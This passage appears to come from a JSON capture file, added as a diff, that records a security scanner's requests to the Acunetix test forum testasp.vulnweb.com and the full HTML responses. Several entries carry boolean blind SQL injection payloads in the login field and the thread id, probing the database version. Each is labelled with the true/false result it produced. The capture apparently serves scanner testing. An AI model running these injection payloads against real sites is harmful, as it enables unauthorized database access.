colspan=\"2\"><!-- InstanceBeginEditable name=\"MainContentLeft\" -->\r\n\t<div class=\"path\">\r\n\t\t\tAcunetix Web Vulnerability Scanner\r\n\t\t</div>\r\n\t<table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"5\">\r\n      <tr>\r\n        <td class=\"tableheader\">Thread</td>\r\n        <td class=\"tableheader\">Posts</td>\r\n\t\t<td class=\"tableheader\">Posted by</td>\r\n        <td class=\"tableheader\">Last Post</td>\r\n      </tr>   \r\n\t<tr bgcolor='#FFFFFF'><td><div class='threadtitle'><a href='showthread.asp?id=0'>1</a></div></td><td>1</td><td>admin</td><td>11/9/2005 12:16:25 PM</td></tr><tr bgcolor='#e9ffe9'><td><div class='threadtitle'><a href='showthread.asp?id=1'>2</a></div></td><td>1</td><td>admin</td><td>11/9/2005 12:16:28 PM</td></tr><tr bgcolor='#FFFFFF'><td><div class='threadtitle'><a href='showthread.asp?id=2'>3</a></div></td><td>2</td><td>admin</td><td>11/9/2005 1:08:52 PM</td></tr><tr bgcolor='#e9ffe9'><td><div class='threadtitle'><a href='showthread.asp?id=3'>aaa</a></div></td><td>1</td><td>admin</td><td>11/9/2005 1:45:54 PM</td></tr><tr bgcolor='#FFFFFF'><td><div class='threadtitle'><a href='showthread.asp?id=4'>tripscan — практический разбор возможностей сервиса для планирования поездок</a></div></td><td>1</td><td>NicholasevozY</td><td>10/4/2026 5:39:34 PM</td></tr><tr bgcolor='#e9ffe9'><td><div class='threadtitle'><a href='showthread.asp?id=5'>tripscan — Пошаговый разбор : от первой поездки до сложных маршрутов</a></div></td><td>1</td><td>ThomasHusia</td><td>10/4/2026 5:39:55 PM</td></tr><tr bgcolor='#FFFFFF'><td><div class='threadtitle'><a href='showthread.asp?id=6'>tripscan — в ежедневном режиме: как устроена повседневная работа с сервисом</a></div></td><td>1</td><td>Victorinpub</td><td>10/4/2026 5:45:23 PM</td></tr><tr bgcolor='#e9ffe9'><td><div class='threadtitle'><a href='showthread.asp?id=7'>Compare Gift Cards</a></div></td><td>1</td><td>LloydObems</td><td>10/4/2026 5:53:27 PM</td></tr><tr bgcolor='#FFFFFF'><td><div class='threadtitle'><a href='showthread.asp?id=8'>Compare Gift Cards</a></div></td><td>1</td><td>JamesBrins</td><td>10/4/2026 5:53:27 PM</td></tr><tr bgcolor='#e9ffe9'><td><div class='threadtitle'><a href='showthread.asp?id=9'>Кракен сайт вход недорогой кракен велосипед отзывы</a></div></td><td>1</td><td>DmuiApamy</td><td>10/4/2026 5:55:55 PM</td></tr>\r\n\t</table>\r\n\t\r\n      <!-- tinyMCE -->\r\n      <script la",
+   "size": 5950,
+   "redirect_chain": [
+    [
+     302,
+     "http://testasp.vulnweb.com/showforum.asp?id=0"
+    ]
+   ]
+  },
+  "label": "version_true",
+  "t": 1791137094.394
+ },
+ "pr-0016": {
+  "request": {
+   "method": "POST",
+   "url": "http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": "tfUName=1%27+OR+%40%40version+LIKE+%27zzz-sentinel-nope%25%27+--&tfUPass=sentinel"
+  },
+  "response": {
+   "status": 200,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "set-cookie": "ASPSESSIONID=[REDACTED]; path=/",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:53 GMT",
+    "content-length": "3235"
+   },
+   "body": "\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\r\n<html><!-- InstanceBegin template=\"/Templates/MainTemplate.dwt.asp\" codeOutsideHTMLIsLocked=\"false\" -->\r\n<head>\r\n<!-- InstanceBeginEditable name=\"doctitle\" -->\r\n<title>acuforum login</title>\r\n<!-- InstanceEndEditable -->\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<!-- InstanceBeginEditable name=\"head\" -->\r\n<!-- InstanceEndEditable -->\r\n<link href=\"styles.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body> \r\n<table width=\"100%\"  border=\"0\" cellpadding=\"10\" cellspacing=\"0\"> \r\n  <tr bgcolor=\"#008F00\"> \r\n    <td width=\"306px\"><a href=\"https://www.acunetix.com/\"><img src=\"Images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></td> \r\n    <td align=\"right\" valign=\"middle\" bgcolor=\"#008F00\" class=\"disclaimer\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><div class=\"menubar\"><a href=\"Templatize.asp?item=html/about.html\" class=\"menu\">about</a> - <a href=\"Default.asp\" class=\"menu\">forums</a> - <a href=\"Search.asp\" class=\"menu\">search</a> \r\n     - <a href=\"./Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0\" class=\"menu\">login</a> - <a href=\"./Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0\" class=\"menu\">register</a> \r\n\t- <a href=\"https://www.acunetix.com/vulnerability-scanner/sql-injection/\" class=\"menu\">SQL scanner</a> - <a href=\"https://www.acunetix.com/websitesecurity/sql-injection/\" class=\"menu\">SQL vuln help</a>\r\n    </div></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><!-- InstanceBeginEditable name=\"MainContentLeft\" -->\r\n\t\t<form action=\"\" method=\"POST\">\r\n\t\t<table width=\"350\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"5\" class=\"FramedForm\">\r\n            <tr>\r\n              <td>Username:</td>\r\n              <td align=\"right\"><input name=\"tfUName\" type=\"text\" class=\"Login\" id=\"tfUName\"></td>\r\n            </tr>\r\n            <tr>\r\n              <td>Password:</td>\r\n              <td align=\"right\"><input name=\"tfUPass\" type=\"password\" class=\"Login\" id=\"tfUPass\"></td>\r\n            </tr>\r\n            <tr>\r\n              <td>&nbsp;</td>\r\n              <td align=\"right\"><input type=\"submit\" value=\"Login\"></td>\r\n            </tr>\r\n          </table>\r\n\t  </form>\r\n\t\t  <b>Invalid login!</b>\r\n    <!-- InstanceEndEditable --></td> \r\n  </tr> \r\n  <tr align=\"right\" bgcolor=\"#FFFFFF\"> \r\n    <td colspan=\"2\" class=\"footer\">Copyright 2019 Acunetix Ltd.</td> \r\n  </tr> \r\n</table> \r\n<div style=\"background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px\">\r\n\t<p style=\"padding-left:20%;padding-right:20%\"><b>Warning</b>: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</p>\r\n</div>\r\n</body>\r\n<!-- InstanceEnd --></html>\r\n",
+   "size": 3235,
+   "redirect_chain": []
+  },
+  "label": "version_false",
+  "t": 1791137095.247
+ },
+ "pr-0017": {
+  "request": {
+   "method": "POST",
+   "url": "http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": "tfUName=1%27+OR+SUBSTRING%28%40%40version%2C1%2C1%29%3D%278%27+--&tfUPass=sentinel"
+  },
+  "response": {
+   "status": 200,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "set-cookie": "ASPSESSIONID=[REDACTED]; path=/",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:53 GMT",
+    "content-length": "3235"
+   },
+   "body": "\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\r\n<html><!-- InstanceBegin template=\"/Templates/MainTemplate.dwt.asp\" codeOutsideHTMLIsLocked=\"false\" -->\r\n<head>\r\n<!-- InstanceBeginEditable name=\"doctitle\" -->\r\n<title>acuforum login</title>\r\n<!-- InstanceEndEditable -->\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<!-- InstanceBeginEditable name=\"head\" -->\r\n<!-- InstanceEndEditable -->\r\n<link href=\"styles.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body> \r\n<table width=\"100%\"  border=\"0\" cellpadding=\"10\" cellspacing=\"0\"> \r\n  <tr bgcolor=\"#008F00\"> \r\n    <td width=\"306px\"><a href=\"https://www.acunetix.com/\"><img src=\"Images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></td> \r\n    <td align=\"right\" valign=\"middle\" bgcolor=\"#008F00\" class=\"disclaimer\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><div class=\"menubar\"><a href=\"Templatize.asp?item=html/about.html\" class=\"menu\">about</a> - <a href=\"Default.asp\" class=\"menu\">forums</a> - <a href=\"Search.asp\" class=\"menu\">search</a> \r\n     - <a href=\"./Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0\" class=\"menu\">login</a> - <a href=\"./Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0\" class=\"menu\">register</a> \r\n\t- <a href=\"https://www.acunetix.com/vulnerability-scanner/sql-injection/\" class=\"menu\">SQL scanner</a> - <a href=\"https://www.acunetix.com/websitesecurity/sql-injection/\" class=\"menu\">SQL vuln help</a>\r\n    </div></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><!-- InstanceBeginEditable name=\"MainContentLeft\" -->\r\n\t\t<form action=\"\" method=\"POST\">\r\n\t\t<table width=\"350\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"5\" class=\"FramedForm\">\r\n            <tr>\r\n              <td>Username:</td>\r\n              <td align=\"right\"><input name=\"tfUName\" type=\"text\" class=\"Login\" id=\"tfUName\"></td>\r\n            </tr>\r\n            <tr>\r\n              <td>Password:</td>\r\n              <td align=\"right\"><input name=\"tfUPass\" type=\"password\" class=\"Login\" id=\"tfUPass\"></td>\r\n            </tr>\r\n            <tr>\r\n              <td>&nbsp;</td>\r\n              <td align=\"right\"><input type=\"submit\" value=\"Login\"></td>\r\n            </tr>\r\n          </table>\r\n\t  </form>\r\n\t\t  <b>Invalid login!</b>\r\n    <!-- InstanceEndEditable --></td> \r\n  </tr> \r\n  <tr align=\"right\" bgcolor=\"#FFFFFF\"> \r\n    <td colspan=\"2\" class=\"footer\">Copyright 2019 Acunetix Ltd.</td> \r\n  </tr> \r\n</table> \r\n<div style=\"background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px\">\r\n\t<p style=\"padding-left:20%;padding-right:20%\"><b>Warning</b>: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</p>\r\n</div>\r\n</body>\r\n<!-- InstanceEnd --></html>\r\n",
+   "size": 3235,
+   "redirect_chain": []
+  },
+  "label": "version_digit_8",
+  "t": 1791137095.57
+ },
+ "pr-0018": {
+  "request": {
+   "method": "POST",
+   "url": "http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": "tfUName=1%27+OR+SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27+--&tfUPass=sentinel"
+  },
+  "response": {
+   "status": 200,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "set-cookie": "ASPSESSIONID=[REDACTED]; path=/",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:54 GMT",
+    "content-length": "3235"
+   },
+   "body": "\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\r\n<html><!-- InstanceBegin template=\"/Templates/MainTemplate.dwt.asp\" codeOutsideHTMLIsLocked=\"false\" -->\r\n<head>\r\n<!-- InstanceBeginEditable name=\"doctitle\" -->\r\n<title>acuforum login</title>\r\n<!-- InstanceEndEditable -->\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<!-- InstanceBeginEditable name=\"head\" -->\r\n<!-- InstanceEndEditable -->\r\n<link href=\"styles.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body> \r\n<table width=\"100%\"  border=\"0\" cellpadding=\"10\" cellspacing=\"0\"> \r\n  <tr bgcolor=\"#008F00\"> \r\n    <td width=\"306px\"><a href=\"https://www.acunetix.com/\"><img src=\"Images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></td> \r\n    <td align=\"right\" valign=\"middle\" bgcolor=\"#008F00\" class=\"disclaimer\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><div class=\"menubar\"><a href=\"Templatize.asp?item=html/about.html\" class=\"menu\">about</a> - <a href=\"Default.asp\" class=\"menu\">forums</a> - <a href=\"Search.asp\" class=\"menu\">search</a> \r\n     - <a href=\"./Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0\" class=\"menu\">login</a> - <a href=\"./Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0\" class=\"menu\">register</a> \r\n\t- <a href=\"https://www.acunetix.com/vulnerability-scanner/sql-injection/\" class=\"menu\">SQL scanner</a> - <a href=\"https://www.acunetix.com/websitesecurity/sql-injection/\" class=\"menu\">SQL vuln help</a>\r\n    </div></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><!-- InstanceBeginEditable name=\"MainContentLeft\" -->\r\n\t\t<form action=\"\" method=\"POST\">\r\n\t\t<table width=\"350\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"5\" class=\"FramedForm\">\r\n            <tr>\r\n              <td>Username:</td>\r\n              <td align=\"right\"><input name=\"tfUName\" type=\"text\" class=\"Login\" id=\"tfUName\"></td>\r\n            </tr>\r\n            <tr>\r\n              <td>Password:</td>\r\n              <td align=\"right\"><input name=\"tfUPass\" type=\"password\" class=\"Login\" id=\"tfUPass\"></td>\r\n            </tr>\r\n            <tr>\r\n              <td>&nbsp;</td>\r\n              <td align=\"right\"><input type=\"submit\" value=\"Login\"></td>\r\n            </tr>\r\n          </table>\r\n\t  </form>\r\n\t\t  <b>Invalid login!</b>\r\n    <!-- InstanceEndEditable --></td> \r\n  </tr> \r\n  <tr align=\"right\" bgcolor=\"#FFFFFF\"> \r\n    <td colspan=\"2\" class=\"footer\">Copyright 2019 Acunetix Ltd.</td> \r\n  </tr> \r\n</table> \r\n<div style=\"background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px\">\r\n\t<p style=\"padding-left:20%;padding-right:20%\"><b>Warning</b>: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</p>\r\n</div>\r\n</body>\r\n<!-- InstanceEnd --></html>\r\n",
+   "size": 3235,
+   "redirect_chain": []
+  },
+  "label": "version_digit_5",
+  "t": 1791137095.964
+ },
+ "pr-0019": {
+  "request": {
+   "method": "GET",
+   "url": "http://testasp.vulnweb.com/showthread.asp?id=3+AND+1%3D1",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": ""
+  },
+  "response": {
+   "status": 200,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "set-cookie": "ASPSESSIONID=[REDACTED]; path=/",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:54 GMT",
+    "content-length": "3142"
+   },
+   "body": "\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\r\n<html><!-- InstanceBegin template=\"/Templates/MainTemplate.dwt.asp\" codeOutsideHTMLIsLocked=\"false\" -->\r\n<head>\r\n<!-- InstanceBeginEditable name=\"doctitle\" -->\r\n<title>acuforum\r\naaa\r\n</title>\r\n<!-- InstanceEndEditable -->\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<!-- InstanceBeginEditable name=\"head\" --><!-- InstanceEndEditable -->\r\n<link href=\"styles.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body> \r\n<table width=\"100%\"  border=\"0\" cellpadding=\"10\" cellspacing=\"0\"> \r\n  <tr bgcolor=\"#008F00\"> \r\n    <td width=\"306px\"><a href=\"https://www.acunetix.com/\"><img src=\"Images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></td> \r\n    <td align=\"right\" valign=\"middle\" bgcolor=\"#008F00\" class=\"disclaimer\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><div class=\"menubar\"><a href=\"Templatize.asp?item=html/about.html\" class=\"menu\">about</a> - <a href=\"Default.asp\" class=\"menu\">forums</a> - <a href=\"Search.asp\" class=\"menu\">search</a> \r\n     - <a href=\"./Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D3%2BAND%2B1%253D1\" class=\"menu\">login</a> - <a href=\"./Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D3%2BAND%2B1%253D1\" class=\"menu\">register</a> \r\n\t- <a href=\"https://www.acunetix.com/vulnerability-scanner/sql-injection/\" class=\"menu\">SQL scanner</a> - <a href=\"https://www.acunetix.com/websitesecurity/sql-injection/\" class=\"menu\">SQL vuln help</a>\r\n    </div></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><!-- InstanceBeginEditable name=\"MainContentLeft\" -->\r\n\t\t<div class=\"path\">\r\n\t\t\t<a href=\"showforum.asp?id=0\">Acunetix Web Vulnerability Scanner</a>/aaa\r\n\t\t</div>\r\n      <table width=\"100%\" cellspacing=\"1\" cellpadding=\"5\" bgcolor=\"#E5E5E5\">\r\n        <tr><td valign='top' align='center' bgcolor='#FFFFFF' width='120'><img src='avatars/noavatar.gif'><br>posted by <b>admin</b> on 11/9/2005 1:45:54 PM</td><td valign='top' bgcolor='#FFFFFF'><div class='posttitle'>aaa</div><div class='posttext'><u>aaasasas<em>sasasas</em></u><em>asasas</em>saasas<strong>asasas</strong></div></td></tr>\r\n      </table>\r\n      \r\n      <!-- InstanceEndEditable --></td> \r\n  </tr> \r\n  <tr align=\"right\" bgcolor=\"#FFFFFF\"> \r\n    <td colspan=\"2\" class=\"footer\">Copyright 2019 Acunetix Ltd.</td> \r\n  </tr> \r\n</table> \r\n<div style=\"background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px\">\r\n\t<p style=\"padding-left:20%;padding-right:20%\"><b>Warning</b>: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</p>\r\n</div>\r\n</body>\r\n<!-- InstanceEnd --></html>\r\n",
+   "size": 3142,
+   "redirect_chain": []
+  },
+  "label": "control_true",
+  "t": 1791137096.303
+ },
+ "pr-0020": {
+  "request": {
+   "method": "GET",
+   "url": "http://testasp.vulnweb.com/showthread.asp?id=3+AND+1%3D2",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": ""
+  },
+  "response": {
+   "status": 500,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "set-cookie": "ASPSESSIONID=[REDACTED]; path=/",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:54 GMT",
+    "content-length": "1208"
+   },
+   "body": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"/>\r\n<title>500 - Internal server error.</title>\r\n<style type=\"text/css\">\r\n<!--\r\nbody{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}\r\nfieldset{padding:0 15px 10px 15px;} \r\nh1{font-size:2.4em;margin:0;color:#FFF;}\r\nh2{font-size:1.7em;margin:0;color:#CC0000;} \r\nh3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} \r\n#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:\"trebuchet MS\", Verdana, sans-serif;color:#FFF;\r\nbackground-color:#555555;}\r\n#content{margin:0 0 0 2%;position:relative;}\r\n.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}\r\n-->\r\n</style>\r\n</head>\r\n<body>\r\n<div id=\"header\"><h1>Server Error</h1></div>\r\n<div id=\"content\">\r\n <div class=\"content-container\"><fieldset>\r\n  <h2>500 - Internal server error.</h2>\r\n  <h3>There is a problem with the resource you are looking for, and it cannot be displayed.</h3>\r\n </fieldset></div>\r\n</div>\r\n</body>\r\n</html>\r\n",
+   "size": 1208,
+   "redirect_chain": []
+  },
+  "label": "control_false",
+  "t": 1791137096.629
+ },
+ "pr-0021": {
+  "request": {
+   "method": "GET",
+   "url": "http://testasp.vulnweb.com/showthread.asp?id=3+AND+%40%40version+LIKE+%27%25%27",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": ""
+  },
+  "response": {
+   "status": 200,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "set-cookie": "ASPSESSIONID=[REDACTED]; path=/",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:55 GMT",
+    "content-length": "3212"
+   },
+   "body": "\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\r\n<html><!-- InstanceBegin template=\"/Templates/MainTemplate.dwt.asp\" codeOutsideHTMLIsLocked=\"false\" -->\r\n<head>\r\n<!-- InstanceBeginEditable name=\"doctitle\" -->\r\n<title>acuforum\r\naaa\r\n</title>\r\n<!-- InstanceEndEditable -->\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<!-- InstanceBeginEditable name=\"head\" --><!-- InstanceEndEditable -->\r\n<link href=\"styles.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body> \r\n<table width=\"100%\"  border=\"0\" cellpadding=\"10\" cellspacing=\"0\"> \r\n  <tr bgcolor=\"#008F00\"> \r\n    <td width=\"306px\"><a href=\"https://www.acunetix.com/\"><img src=\"Images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></td> \r\n    <td align=\"right\" valign=\"middle\" bgcolor=\"#008F00\" class=\"disclaimer\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><div class=\"menubar\"><a href=\"Templatize.asp?item=html/about.html\" class=\"menu\">about</a> - <a href=\"Default.asp\" class=\"menu\">forums</a> - <a href=\"Search.asp\" class=\"menu\">search</a> \r\n     - <a href=\"./Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D3%2BAND%2B%2540%2540version%2BLIKE%2B%2527%2525%2527\" class=\"menu\">login</a> - <a href=\"./Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D3%2BAND%2B%2540%2540version%2BLIKE%2B%2527%2525%2527\" class=\"menu\">register</a> \r\n\t- <a href=\"https://www.acunetix.com/vulnerability-scanner/sql-injection/\" class=\"menu\">SQL scanner</a> - <a href=\"https://www.acunetix.com/websitesecurity/sql-injection/\" class=\"menu\">SQL vuln help</a>\r\n    </div></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><!-- InstanceBeginEditable name=\"MainContentLeft\" -->\r\n\t\t<div class=\"path\">\r\n\t\t\t<a href=\"showforum.asp?id=0\">Acunetix Web Vulnerability Scanner</a>/aaa\r\n\t\t</div>\r\n      <table width=\"100%\" cellspacing=\"1\" cellpadding=\"5\" bgcolor=\"#E5E5E5\">\r\n        <tr><td valign='top' align='center' bgcolor='#FFFFFF' width='120'><img src='avatars/noavatar.gif'><br>posted by <b>admin</b> on 11/9/2005 1:45:54 PM</td><td valign='top' bgcolor='#FFFFFF'><div class='posttitle'>aaa</div><div class='posttext'><u>aaasasas<em>sasasas</em></u><em>asasas</em>saasas<strong>asasas</strong></div></td></tr>\r\n      </table>\r\n      \r\n      <!-- InstanceEndEditable --></td> \r\n  </tr> \r\n  <tr align=\"right\" bgcolor=\"#FFFFFF\"> \r\n    <td colspan=\"2\" class=\"footer\">Copyright 2019 Acunetix Ltd.</td> \r\n  </tr> \r\n</table> \r\n<div style=\"background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px\">\r\n\t<p style=\"padding-left:20%;padding-right:20%\"><b>Warning</b>: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</p>\r\n</div>\r\n</body>\r\n<!-- InstanceEnd --></html>\r\n",
+   "size": 3212,
+   "redirect_chain": []
+  },
+  "label": "version_true",
+  "t": 1791137096.985
+ },
+ "pr-0022": {
+  "request": {
+   "method": "GET",
+   "url": "http://testasp.vulnweb.com/showthread.asp?id=3+AND+%40%40version+LIKE+%27zzz-sentinel-nope%25%27",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": ""
+  },
+  "response": {
+   "status": 500,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "set-cookie": "ASPSESSIONID=[REDACTED]; path=/",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:55 GMT",
+    "content-length": "1208"
+   },
+   "body": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"/>\r\n<title>500 - Internal server error.</title>\r\n<style type=\"text/css\">\r\n<!--\r\nbody{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}\r\nfieldset{padding:0 15px 10px 15px;} \r\nh1{font-size:2.4em;margin:0;color:#FFF;}\r\nh2{font-size:1.7em;margin:0;color:#CC0000;} \r\nh3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} \r\n#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:\"trebuchet MS\", Verdana, sans-serif;color:#FFF;\r\nbackground-color:#555555;}\r\n#content{margin:0 0 0 2%;position:relative;}\r\n.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}\r\n-->\r\n</style>\r\n</head>\r\n<body>\r\n<div id=\"header\"><h1>Server Error</h1></div>\r\n<div id=\"content\">\r\n <div class=\"content-container\"><fieldset>\r\n  <h2>500 - Internal server error.</h2>\r\n  <h3>There is a problem with the resource you are looking for, and it cannot be displayed.</h3>\r\n </fieldset></div>\r\n</div>\r\n</body>\r\n</html>\r\n",
+   "size": 1208,
+   "redirect_chain": []
+  },
+  "label": "version_false",
+  "t": 1791137097.303
+ },
+ "pr-0023": {
+  "request": {
+   "method": "GET",
